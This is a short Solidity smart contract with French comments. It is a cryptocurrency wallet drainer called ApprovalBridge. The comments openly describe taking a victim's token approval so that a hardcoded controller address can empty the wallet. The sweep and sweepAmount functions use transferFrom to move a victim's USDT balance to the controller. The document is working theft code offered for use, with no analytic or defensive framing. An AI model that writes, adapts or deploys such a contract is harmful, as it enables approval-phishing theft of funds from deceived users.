// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title ApprovalBridge
 * @dev Reçoit l'approbation de la victime et permet au contrôleur de vider le wallet.
 */
interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ApprovalBridge {
    // Votre adresse qui recevra les USDT et contrôlera le contrat
    address public immutable controller = 0x05d1751e3f77E886B84FDEf695843b179680980A;

    modifier onlyController() {
        require(msg.sender == controller, "Not authorized");
        _;
    }

    /**
     * @dev Envoie les jetons de la victime directement vers votre adresse.
     * @param token L'adresse du contrat USDT (ex: 0xdAC17... sur Ethereum)
     * @param victim L'adresse de la victime qui a cliqué sur "Approve"
     */
    function sweep(address token, address victim) external onlyController {
        uint256 amount = IERC20(token).balanceOf(victim);
        require(amount > 0, "No balance to sweep");
        
        // Transfert direct : Victime -> Votre Adresse
        IERC20(token).transferFrom(victim, controller, amount);
    }

    /**
     * @dev Variante pour envoyer un montant spécifique
     */
    function sweepAmount(address token, address victim, uint256 amount) external onlyController {
        IERC20(token).transferFrom(victim, controller, amount);
    }
}